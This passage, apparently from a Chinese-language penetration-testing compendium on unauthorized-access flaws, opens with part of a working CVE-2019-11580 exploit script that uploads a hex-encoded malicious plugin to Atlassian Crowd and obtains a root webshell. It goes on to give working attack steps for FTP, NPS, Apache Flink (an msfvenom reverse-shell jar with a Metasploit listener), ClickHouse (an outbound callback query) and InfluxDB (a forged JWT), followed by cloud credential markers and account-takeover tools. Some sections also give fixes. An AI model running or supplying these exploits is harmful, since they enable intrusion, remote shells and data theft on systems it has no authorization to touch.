305fd19f511b9caa8d4a9ba2d8149f504b03041400000008005a7ff14e3ac5f9ef48030000fa05000017001c00636f6d2f63646c2f7368656c6c2f6578702e636c61737355540900033bd52e5da8d32e5d75780b0001040000000004000000008d54db76d34614dde3d81e451171e2244ddd0b1428e00041bdd094da14682040dae084385c02f4a2c8d3202a4b8a2ca7693fa38f7de9639e793197aed50fe897f417fad2748f708a936641bcb4ce191d9db3cf3e7b3cf3e73fcfff007016ae8971940d4c0ce0244e99388d490367b4b74d7c800fb5f9c8c4c738abcd2726a6f0e900cee13313155425ce4b7c6ea280b236170c5c3431884bfae5925e7d21312d7159207fde0bbce482405f79e2b640f672d8500285392f50b5767345c54bce8acf48ae115e5389c06279ee91b3ee6cd82d15affb2ab11f2649645fa7a9bf082caab5b66a25d5d7a6b5a23068a9aaee7aa09e38ee0f379c286d9652bb2231237155e29ac4758e2360d6c376ecaaab9ea663a88de88cee60e14d94c8de6d36586461165fb2ccc257981380851ba849cc5b58c04d0b8ba813d0c2126e59b88d5b84b6700777d9cbc232ee49dcb7f0005f0b8c686cdb7782557b66c35551e28581c0f8cb683d89bd6075baedf90d155bf806df0a08d3c27720a5154d69d80d9bb6dbf0edd643e5fb36090b1c7cb52802c7f625aec0f1fda92b30b49b3289bd0c2dc4a1ab5aaded79bdd09e0da276c24ce53405ac55952c38b1d354898ad9f4c5def7a25527fe1f1290eb8edf56f3dfef2a995f79a4dc64ef923c27737c3219dbabe2de0ed68bed20f19a1cce24bfff5ec6cabdc0dd3091b36a43b902275e43be2b050b0689ba4386f16de49dfa745367e2388cb753b3748df430cd0af4f3eb9dd84bb5ebc55860f3ee876a8ff43d619eb71ff58280e5597d42f24e14a980c893fbda83eeff92e846126eeffb68794fe50b91ee9b9ec0a5d871150ee30dde3dfa9781d0c78bf62dbebd4bcf3385dcc927108fb910789b369f06b57d274d61aa28b3b49fd19f4f1533cfd097c153646bc55c253b59cc7590ff15e79e424e766054722506fa2b79edcc8aec9b324af90e0696a78ccc6f289e7e068b3b6bfcd2c181cdadbf3671b492fb1d85e527182a653b182e166974e9087d07a395ec268c1a81c71e93c1106ab8c9cb0e5843429f49f94e330e98bc1b06b81ae478051ce16a02c3bc538bbc4d477011a3ac2db17a1c754ab0c6d9124ed626c24f9cf22011ae20bfc5e47e894312ef491c9638923e4725dee74355b65892dbf51dfa763bf6370e6997a55ec753a14ffc0b504b01021e031400000008007c7ef14e544c2527eb00000004020000140018000000000001000000ed810000000061746c61737369616e2d706c7567696e2e786d6c55540500039bd32e5d75780b000104000000000400000000504b01021e030a00000000001b7ff14e000000000000000000000000040018000000000000001000ed4139010000636f6d2f5554050003c6d42e5d75780b000104000000000400000000504b01021e030a00000000001b7ff14e000000000000000000000000080018000000000000001000ed4177010000636f6d2f63646c2f5554050003c6d42e5d75780b000104000000000400000000504b01021e030a0000000000d07df14e0000000000000000000000000e0018000000000000001000ed41b9010000636f6d2f63646c2f7368656c6c2f555405000357d22e5d75780b000104000000000400000000504b01021e031400000008008878f14ec2481cb07d0100008d030000160018000000000001000000ed8101020000636f6d2f63646c2f7368656c6c2f43646c2e6a61766155540500036fc82e5d75780b000104000000000400000000504b01021e0314000000080085b2f04ecafaf82fe500000004180000170018000000000000000000a481ce030000636f6d2f63646c2f7368656c6c2f2e44535f53746f726555540500031add2d5d75780b000104000000000400000000504b01021e03140000000800b178f14ed0054a4648030000fa050000170018000000000000000000a48104050000636f6d2f63646c2f7368656c6c2f43646c2e636c6173735554050003bdc82e5d75780b000104000000000400000000504b01021e0314000000080080b2f04e5e4c2ce89701000004180000110018000000000000000000a4819d080000636f6d2f63646c2f2e44535f53746f726555540500030fdd2d5d75780b000104000000000400000000504b01021e0314000000080080b2f04e7261dc5f94010000041800000d0018000000000000000000a4817f0a0000636f6d2f2e44535f53746f726555540500030fdd2d5d75780b000104000000000400000000504b01021e03140000000800b57df14ef98bc46d88010000c3030000160018000000000001000000a4815a0c0000636f6d2f63646c2f7368656c6c2f6578702e6a617661555405000326d22e5d75780b000104000000000400000000504b01021e031400000008005a7ff14e3ac5f9ef48030000fa050000170018000000000000000000a481320e0000636f6d2f63646c2f7368656c6c2f6578702e636c61737355540500033bd52e5d75780b000104000000000400000000504b0506000000000b000b00bf030000cb11000000000d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6631356665383765393561372d2d0d0a"
    data = s.decode("hex")
    r = requests.post(url=url_vuln, headers=headers, data=data, verify=False)
    if r.status_code ==200 and "Installed" in r.content:
        print
        print r.content
        getwebshell(url)
    else:
        print  "No Exit!"
def getwebshell(url):
    webshell_url = url + "/crowd/plugins/servlet/exp?cmd=whoami"
    r = requests.get(webshell_url, verify=False)
    if r.status_code==200:
        print ">>>Get Webshell\n"
        print webshell_url+'\n'
        print "Exec command= whoami\n\nResult= %s"%r.text


if __name__ == '__main__':
    url = sys.argv[1]
    is_url(url)
```

执行命令：

```plain
[root@localhost CVE-2019-11580-master]# python CVE-2019-11580.py http://192.168.32.183:8095

   _______      ________    ___   ___  __  ___        __ __ _____  ___   ___
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ /_ | ____|/ _ \ / _ \
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______| || | |__ | (_) | | | |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______| || |___ \ > _ <| | | |
 | |____   \  /  | |____    / /_| |_| || |  / /       | || |___) | (_) | |_| |
  \_____|   \/   |______|  |____|\___/ |_| /_/        |_||_|____/ \___/ \___/



                  python CVE-2019-11580.py http://xx.xx.xx.xx


http://192.168.32.183:8095/crowd/admin/uploadplugin.action

Installed plugin /opt/atlassian-crowd-3.4.3/apache-tomcat/temp/plugindev-7114709723171005763rce.jar

>>>Get Webshell

http://192.168.32.183:8095/crowd/plugins/servlet/exp?cmd=whoami

Exec command= whoami

Result= root
```

  

访问获取的 shell 地址，无需认证登录即可获取 IP 地址。

![图片](assets/1710814131-713a2a4c2f834746ddadbebf2cbafcde.png)

  

### **3.33、ftp 未授权访问漏洞**

**简介：**FTP 服务开启了匿名用户登录的设置或者未做好权限校验，导致 FTP 服务容易被攻击者上传或下载敏感文件。

**漏洞利用：**

#### **1）未授权访问：**

ftp://ip:port/

![图片](assets/1710814131-125ded4bd7313d8e5e4616afb9b2d18e.png)

  

#### **2）匿名登录**

```plain
1、nmap探测
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19 12:18AM 1024 .rnd
| 02-25-19 10:15PM <DIR> inetpub
| 07-16-16 09:18AM <DIR> PerfLogs
| 02-25-19 10:56PM <DIR> Program Files
| 02-03-19 12:28AM <DIR> Program Files (x86)
| 02-03-19 08:08AM <DIR> Users
|_02-25-19 11:49PM <DIR> Windows
| ftp-syst:
|_ SYST: Windows_NT

2、匿名登录
(kali㉿kali)-[~]
└─$ ftp 10.129.96.142
Connected to 10.129.96.142.
220 Microsoft FTP Service
Name (10.129.96.142:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as
password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

修复方案：  

```plain
禁止匿名登录；
配置强密码，密码长度建议八位以上，且密码应包括大小写字母、特殊字符、数字混合体；
```

  

### **3.34、NPS 未授权访问漏洞**

**简介：**nps 是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持 tcp、udp 流量转发，可支持任何 tcp、udp 上层协议（访问内网网站、本地支付接口调试、ssh 访问、远程桌面，内网 dns 解析等等），此外还支持内网 http 代理、内网 socks5 代理、p2p 等，并带有功能强大的 web 管理端。

其中 auth\_key 存在未授权访问漏洞，当 nps.conf 中的 auth\_key 未配置时攻击者通过生成特定的请求包可以获取服务器后台权限。只需要在 post 内容中添加 auth\_key 和 timestamp 两个参数，分别对应 md5 (timestamp) 和 timestamp 即可。直接访问生成的 url 可以看到后台

**漏洞利用：**

auth\_key 和 timestamp 的时效只有 20s，所以需要不停的生成。并且需要手动添加到 get 请求和着 post 请求的参数中。

client 列表接口

![图片](assets/1710814131-114c3788a599c38647631d51cbeea497.png)

  

exp 请求接口

```plain
POST /client/list HTTP/1.1
Host: vps:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 98
Origin: http://vps:port
Connection: close
Referer: http://vps:port/client/list

search=&order=asc&offset=0&limit=10&auth_key=805df7d1f7bf3b662939ca091174e6b4&timestamp=1659948547
```

![图片](assets/1710814131-ee785fb6bcbceb59696b6851eb2f7718.png)

  

**修复建议：**

编辑 nps.conf，取消注释 auth\_key, 添加 auth\_crypt\_key 注释。

```plain
nps.conf路径：/etc/nps/conf/nps.conf
```

**参考文章：**

```plain
NPS未授权漏洞复现（护网反制红队老哥🐔）
https://bbs.chaitin.cn/topic/409
```

  

### **3.35、Apache Flink 未授权访问漏洞**

**简介：**Apache Flink Dashboard 默认没有用户权限认证，攻击者可以通过未授权的 Flink Dashboard 控制台直接上传木马 jar 包，可远程执行任意系统命令获取服务器权限。

影响版本：Apache Flink <= 1.9.1 (最新版本)

**漏洞利用：**

msf 生成恶意 jar 包：

```plain
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.32.130 LPORT=4444 -f jar > metasploit_Payload.jar
```

在 Apache Flink 的 submit new job 功能处上传恶意 jar 包：

![图片](assets/1710814131-37d80127b73f829661c0d17b431e0b18.svg)

  

msf 配置监听：

```plain
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/meterpreter/reverse_tcp
payload => java/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 1291.68.32.130
lhost => 1291.68.32.130
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run
```

利用截图：  

![图片](assets/1710814131-ec1fea4a688312dd528f526161940515.png)

  

**修复建议：**

```plain
针对Apache Flink Dashboard 设置防火墙策略；
禁止Dashboard对外访问或确保只对可信端点开放；
仅允许白名单IP进行访问，并在Web代理中增加对该服务的Digest认证，防止未授权访问。
```

  

### **3.36、clickhouse 未授权访问漏洞**

**简介：**恶意攻击者可以在不提供有效凭据的情况下访问 ClickHouse 服务器。这可能导致未经授权的访问敏感数据，或允许攻击者修改或删除数据。默认情况下，clickhouse-server 会在 8123 端口上监控 HTTP 请求（这可以在配置中修改）。

环境搭建：

```plain
下载安装包
curl https://clickhouse.com/ | sh

安装clickhouse
sudo ./clickhouse install
1）设置默认用户密码
Enter password for the default user:
2)设置可从局域网访问
Allow server to accept connections from the network (default is localhost only), [y/N]: y

启动clickhouse服务
sudo clickhouse start
```

如果在安装界面手贱忘开了局域网访问，可编辑 /etc/clickhouse-server/config.xml 文件，将 listen\_host 旁边的注释删掉。

先停止服务：

```plain
sudo clickhouse stop
```

删除 listen\_host 的注释：

![图片](assets/1710814131-f24bcda084b098dc88463e5eccd1b51f.png)

  

然后重新启动服务即可

```plain
sudo clickhouse start
```

前后对比：

![图片](assets/1710814131-e1832257e021098a6e281124465a5f43.png)

  

参考文章：

```plain
https://bibichuan.github.io/posts/7bfa8d86.html
```

  

**漏洞利用：**

1）确定是否使用了 ClickHouse 数据库的接口

```plain
curl http://192.168.0.5:8123
```

根据文档得知，正常返回为 Ok. , 且存在 X-ClickHouse-Summary 作为返回包的 Header

![图片](assets/1710814131-37d80127b73f829661c0d17b431e0b18.svg)

  

2）测试是否可以执行 SQL 命令，部分会开启身份验证导致未授权执行失败

```plain
/?query=SHOW%20DATABASES
```

![图片](assets/1710814131-37d80127b73f829661c0d17b431e0b18.svg)

  

执行失败示例：

![图片](assets/1710814131-7f201aad91c2a7faf33a93fbe9dbaf19.png)

  

3）成功执行语句获取数据，执行其他命令探测出网

```plain
http://192.168.0.5:8123/?query=SELECT%20*%20FROM%20url(%27http://cf1cfb13.dns.1433.eu.org/%27,%20CSV,%20%27column1%20String,%20column2%20UInt32%27)%20LIMIT%203;
```

![图片](assets/1710814131-528f09e124c643557cb9d68ac5eb41c2.png)

  

可以查看 system 库中的执行记录表来获取最近执行的所有 SQL 语句来快速定位可利用的信息 (获取敏感用户信息，数据库名以及数据表名)。

  

### **3.37、InfluxDB 未授权访问漏洞**

简介：InfluxDB 是一个开源分布式时序、时间和指标数据库，使用 Go 语言编写，无需外部依赖。其设计目标是实现分布式和水平伸缩扩展，是 InfluxData 的核心产品。其使用 jwt 作为鉴权方式。在用户开启了认证，但未设置参数 shared-secret 的情况下，jwt 的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在 InfluxDB 中执行 SQL 语句。

```plain
影响版本：InfluxDB < 1.7.6
```

  

**漏洞利用：**

访问 http://xxx:8086/debug/vars 可查看系统服务信息

![图片](assets/1710814131-3688fcfcf92333796c90f73db06643ee.png)

  

直接请求 /query，发现需要登录。

![图片](assets/1710814131-37d80127b73f829661c0d17b431e0b18.svg)

  

通过 https://jwt.io/ 生成 Cookie，绕过身份验证，构造所需的 Token：

```plain
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "admin",
  "exp": 1676346267
}
```

其中，username 需要为已存在的用户，exp 是时间戳，代表该 Token 的过期时间，所以需要生成一个未来的时间戳，其中 1676346267 转换为时间是：2024-04-15 11:44:27，时间戳为：1713152667。将 secret 的值置空，得到编码后的 Token：

![图片](assets/1710814131-e6d4490ec208b9f181dcba61748d9519.png)

  

抓取 /query 页面的数据包，并将请求方式修改为 POST，添加请求头：

```plain
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzEzMTUyNjY3fQ.71O5-Y2TX7nqVLU-GukYzVzZs3bX7T-6Y64cg7GItdw
```

show users

![图片](assets/1710814131-9c7bf43700751bc58082c1885f618abf.png)

  

show databases；

![图片](assets/1710814131-a9db2e9a478eb0a666c4a4bdcaac366b.png)

  

常用命令：

```plain
show databases    # 显示数据库
show users      # 显示用户
show measurements  # 显示所有measurements

create user influx with password '*********' with all privileges;  # 创建用户

create database xxx  # 创建xxx数据库
drop database xxx  # 删除xxx数据库

use xxx    # 使用xxx数据库
select * from measurement_name limit 10
```

  

**参考文章：**

```plain
https://vulhub.org/#/environments/influxdb/unacc/
InfluxDB 未授权访问 漏洞复现
https://blog.csdn.net/weixin_44037296/article/details/118754782
```

  

**4、其他信息泄露**

**4.1、云存储安全**  

![图片](assets/1710814131-ad54a99eaa53f4c55b59f8c85c4989e0.png)

![图片](assets/1710814131-2e158795ebdecc5ae4cf78150a9e1af3.png)

  

#### **1、四种存储桶显示页面**

无存储桶时：InvalidBucketName：表示存储桶的名称不符合规范，属于无效的存储桶名称。

![图片](assets/1710814131-c009fef23e9c93ab161efd645df913d1.png)

  

NoSuchBucket：表示没有这个存储桶

![图片](assets/1710814131-e0566854ce4ca1451d3973b83051e360.png)

  

有存储桶时：列出所有存储对象

![图片](assets/1710814131-d309abac8916d943cdcf63ea1197d96c.png)

  

无访问权限

![图片](assets/1710814131-e585ada437850193db697730cec4d833.png)

  

#### **2、存储策略利用**

获取目标存储桶的权限

![图片](assets/1710814131-a473d2aedb61016ae9a8e253d3c14642.png)

  

可以看到目标允许 UserAgent:"UzJu" 可访问，故可定向构造：

![图片](assets/1710814131-045d388c46021641039572f773c3119d.png)

  

#### **3、攻击方式和案例**

```plain
阿里云存储攻防
https://zone.huoxian.cn/d/918-oss
aws-s3云存储攻防
https://zone.huoxian.cn/d/907-aws-s3
腾讯云COS云存储攻防
https://zone.huoxian.cn/d/949-cos
```

###   

### **4.2、云上秘钥特征及连接方式**

#### **1、秘钥特征**

```plain
1）阿里云
accessKeyId
accessKeySecret

2）华为云
huawei.oss.ak
huawei.oss.sk
huawei.oss.bucket.name
huawei.oss.endpoint
huawei.oss.local.path

3）Google云
private_key_id
private_key

4）微软云
AccountName
AccountKey

5）腾讯云
SecretId
SecretKey

6）亚马逊云-AWS
aws_access_key_id
aws_secret_access_key
```

####   

#### **2、秘钥链接工具：**

![图片](assets/1710814131-98c3aee2ac8ca8650a04850df620c736.png)

```plain
cloudTools：https://github.com/dark-kingA/cloudTools
行云管家：https://www.cloudbility.com/
```

上述统计的厂商为常见或者工具支持的云厂商，仅供参考。另外在接管时，建议 cloudTools 优先，其次是行云管家。

  

**参考文章**

```plain
1. 常见的Web源码泄漏及其利用
https://zhuanlan.zhihu.com/p/110389472
2. 敏感信息泄露总结
https://mp.weixin.qq.com/s/USvM_l3XVl0ZE_ZxZPhAcw
3. VIM学习笔记 交换文件(swap)
https://zhuanlan.zhihu.com/p/26908358
4. 挖洞经验 | 通过Tomcat Servlet示例页面发现的Cookie信息泄露漏洞
https://www.freebuf.com/articles/web/247253.html
5. Jolokia利用和env进阶利用思路
https://blog.csdn.net/weixin_39620370/article/details/111200210
6. 【漏洞复现】Hadoop YARN 资源管理系统 REST API未授权访问
https://blog.csdn.net/weixin_43486390/article/details/111319422
7. 未授权漏洞
https://github.com/yingshang/CybersecurityNote/tree/master/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E
8. docker registry v2 API的使用
https://blog.csdn.net/kan2016/article/details/86105354
9. Docker Registry API未授权访问漏洞
https://www.cnblogs.com/taoqinggang/articles/17863783.html
10. 浅析K8S各种未授权攻击方法
https://zone.huoxian.cn/d/1153-k8s
11. LDAP未授权漏洞验证
https://blog.csdn.net/qq_45300786/article/details/119784338
12. Memcache未授权访问漏洞利用及修复
https://blog.csdn.net/chest_/article/details/105808673
13. NSF未授权访问漏洞/共享文件目录数据信息泄露
https://blog.csdn.net/weixin_38896449/article/details/114026277
14. 【漏洞复现】Weblogic漏洞复现：CVE-2020-14882未授权代码执行
https://cloud.tencent.com/developer/article/1745180
15. NPS未授权漏洞复现（护网反制红队老哥🐔）
https://bbs.chaitin.cn/topic/409
16. Clickhouse数据库之权限管理
https://bibichuan.github.io/posts/7bfa8d86.html
17. InfluxDB 未授权访问 漏洞复现
https://blog.csdn.net/weixin_44037296/article/details/118754782
18. 阿里云存储攻防
https://zone.huoxian.cn/d/918-oss
19. aws-s3云存储攻防
https://zone.huoxian.cn/d/907-aws-s3
20. 腾讯云COS云存储攻防
https://zone.huoxian.cn/d/949-cos
```

  

  

- - -

- - -

- - -
